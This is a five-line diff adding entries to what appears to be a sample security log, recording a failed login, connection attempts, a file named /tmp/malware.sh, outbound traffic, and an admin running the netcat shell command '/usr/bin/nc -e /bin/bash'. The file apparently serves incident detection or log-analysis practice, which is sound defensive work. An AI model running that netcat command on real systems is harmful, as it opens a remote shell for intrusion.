@@ -1,0 +1,5 @@
+[2024-09-14 10:32:01] Failed login from IP 192.168.1.22
+[2024-09-14 10:32:05] Connection attempt from 45.155.204.67
+[2024-09-14 10:33:12] User admin executed suspicious command: /usr/bin/nc -e /bin/bash
+[2024-09-14 10:34:10] File /tmp/malware.sh created by unknown process
+[2024-09-14 10:35:47] Outbound traffic to 185.220.101.34:443 detected
